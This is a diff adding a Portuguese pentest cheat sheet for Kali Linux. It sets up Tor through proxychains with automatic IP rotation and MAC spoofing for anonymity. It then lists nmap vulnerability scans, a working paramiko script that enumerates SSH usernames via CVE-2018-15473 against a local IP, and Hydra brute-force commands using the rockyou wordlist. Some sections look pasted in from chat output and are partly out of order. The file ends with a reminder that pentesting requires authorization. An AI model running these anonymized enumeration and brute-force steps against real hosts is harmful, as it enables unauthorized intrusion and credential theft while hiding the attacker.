@@ -1,0 +1,223 @@
+  REFERÊNCIA COMPLETA — PROXYCHAINS + PENTEST LAB
+  Kali Linux | Criado em: 23/03/2026
+================================================================
+
+
+----------------------------------------------------------------
+BLOCO 1 — INSTALAÇÃO E CONFIGURAÇÃO DO PROXYCHAINS + TOR
+----------------------------------------------------------------
+
+# Instalar proxychains4 e Tor
+sudo apt update && sudo apt install proxychains4 tor -y
+
+# Iniciar o Tor
+sudo systemctl start tor@default
+
+# Habilitar Tor no boot
+sudo systemctl enable tor
+
+# Verificar se o Tor está rodando
+sudo systemctl status tor@default
+
+# Confirmar porta 9050 ativa
+ss -tlnp | grep 9050
+
+
+----------------------------------------------------------------
+BLOCO 2 — CONFIGURAÇÃO DO /etc/proxychains4.conf
+----------------------------------------------------------------
+
+sudo nano /etc/proxychains4.conf
+
+# O arquivo deve ter EXATAMENTE estas linhas descomentadas:
+
+  dynamic_chain           ← linha ~10 (descomentada) 
+  proxy_dns              ← linha ~60 (descomentada)
+
+  [ProxyList]
+
+  socks5 127.0.0.1 9050     ← única linha ativa na lista
+# Tudo mais deve estar comentado com #
+# Salvar: Ctrl+O → Enter → Ctrl+X
+
+# Verificar se o config está correto
+grep -n "dynamic_chain\|socks5\|proxy_dns" /etc/proxychains4.conf
+
+
+----------------------------------------------------------------
+BLOCO 3 — TESTAR PROXYCHAINS
+----------------------------------------------------------------
+
+# Testar IP sem proxy (IP real)
+curl ifconfig.me
+
+# Testar IP com proxy (IP do Tor — deve ser diferente)
+proxychains4 -q curl ifconfig.me
+
+# Comparar os dois de uma vez
+curl ifconfig.me && echo "" && proxychains4 -q curl ifconfig.me
+
+
+----------------------------------------------------------------
+BLOCO 4 — ROTAÇÃO DE IP (TROCAR CIRCUITO TOR)
+----------------------------------------------------------------
+
+# Trocar IP manualmente (novo circuito Tor)
+sudo killall -HUP tor
+
+# Configurar troca automática a cada 30 segundos
+sudo nano /etc/tor/torrc
+
+  # Adicionar no final do arquivo:
+  MaxCircuitDirtiness 30
+  NewCircuitPeriod 30
+
+# Reiniciar Tor após editar torrc
+sudo systemctl restart tor@default
+
+nano /etc/systemd/system/tor-rotate.service
+
+automatizar
+
+[Unit]
+Description=Tor IP Rotator
+After=network.target
+
+[Service]
+ExecStart=/bin/bash -c "while true; do killall -HUP tor; sleep 3; curl -s --proxy socks5://127.0.0.1:9050 ifconfig.me; sleep 30; done"
+Restart=always
+
+[Install]
+WantedBy=multi-user.target
+. Ativar o serviço
+Agora você precisa "avisar" o sistema sobre o novo serviço e colocá-lo para rodar:
+Recarregar o daemon:
+Bash
+sudo systemctl daemon-reload
+Habilitar para iniciar com o sistema:
+Bash
+sudo systemctl enable tor-rotate.service
+Iniciar o serviço agora:
+Bash
+sudo systemctl start tor-rotate.service
+4. Como monitorar se está funcionando?
+Como o serviço está rodando "escondido" (em background), você não verá o IP mudando na sua tela. Para acompanhar o que está acontecendo, use este comando:
+Bash
+sudo journalctl -u tor-rotate.service -f
+
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+nmap -p 22 --script vuln -Pn <IP_ALVO>
+
+# Verificar métodos de autenticação SSH
+nmap -p 22 --script ssh-auth-methods --script-args ssh.user=root <IP_ALVO>
+
+# Descobrir hosts ativos na rede
+nmap -sn 192.168.0.0/24
+
+
+----------------------------------------------------------------
+BLOCO 6 — FASE 2: ENUMERAÇÃO DE USUÁRIOS SSH (CVE-2018-15473)
+----------------------------------------------------------------
+
+# Requer paramiko instalado
+pip install paramiko --break-system-packages
+
+# Script de enumeração de usuários
+python3 -c "
+import socket, paramiko
+
+def check_user(hostname, port, username):
+    sock = socket.socket()
+    sock.connect((hostname, port))
+    transport = paramiko.Transport(sock)
+    transport.start_client()
+    try:
+        transport.auth_publickey(username, paramiko.RSAKey.generate(2048))
+    except paramiko.ssh_exception.AuthenticationException as e:
+        if 'Invalid username' not in str(e):
+            print(f'[+] Usuário válido: {username}')
+    except Exception:
+        pass
+    finally:
+        transport.close()
+
+users = ['root','admin','ubuntu','kali','user','test','git','www-data','deploy']
+for u in users:
+    check_user('192.168.0.184', 22, u)
+"
+
+
+----------------------------------------------------------------
+BLOCO 7 — FASE 3: FORÇA BRUTA SSH (HYDRA)
+----------------------------------------------------------------
+
+# Instalar Hydra
+apt install hydra -y
+
+# Descompactar wordlist rockyou
+gunzip /usr/share/wordlists/rockyou.txt.gz
+
+# Força bruta com lista de usuários + rockyou
+hydra -L /usr/share/wordlists/metasploit/unix_users.txt \
+      -P /usr/share/wordlists/rockyou.txt \
+      -t 4 -T 4 -f \
+      ssh://<IP_ALVO>
+
+# Força bruta com usuário específico
+hydra -l ubuntu \
+      -P /usr/share/wordlists/rockyou.txt \
+      -t 4 -f \
+      ssh://<IP_ALVO>
+
+
+----------------------------------------------------------------
+BLOCO 8 — COMANDOS ÚTEIS GERAIS
+----------------------------------------------------------------
+
+# Ver interfaces e IP local
+ip a
+
+# Ver IP público real
+curl ifconfig.me
+
+# Trocar MAC address (anonimato na rede local)
+sudo ip link set eth0 down
+sudo macchanger -r eth0
+sudo ip link set eth0 up
+macchanger -s eth0
+
+# Usar proxychains com qualquer ferramenta
+proxychains4 <comando>
+proxychains4 nmap -sT -Pn <IP>        # nmap via proxy (usar -sT obrigatório)
+proxychains4 ssh usuario@<IP>
+proxychains4 hydra ...
+proxychains4 sqlmap -u http://alvo"""
+
+# Suprimir output do proxychains
+proxychains4 -q <comando>
+
+# Usar arquivo de config alternativo
+proxychains4 -f /caminho/meu_proxy.conf <comando>
+
+
+----------------------------------------------------------------
+OBSERVAÇÕES IMPORTANTES
+----------------------------------------------------------------
+
+1. proxychains4 -sT no nmap é OBRIGATÓRIO via proxy
+   (SYN scan -sS não funciona — precisa de raw sockets)
+
+2. ip a sempre mostra IP local real — isso é normal
+   O proxychains só altera o IP visto pelo DESTINO
+
+3. tor@default é a instância real do Tor
+   tor.service é apenas o master (exited é normal)
+
+4. rockyou.txt fica em /usr/share/wordlists/rockyou.txt.gz
+   Descompactar antes do primeiro uso com gunzip
+
+5. Pentest APENAS em ambientes próprios ou com autorização
+   Lei 14.155/2021 — invasão sem autorização = crime no Brasil
+
+================================================================
+FIM DO ARQUIVO
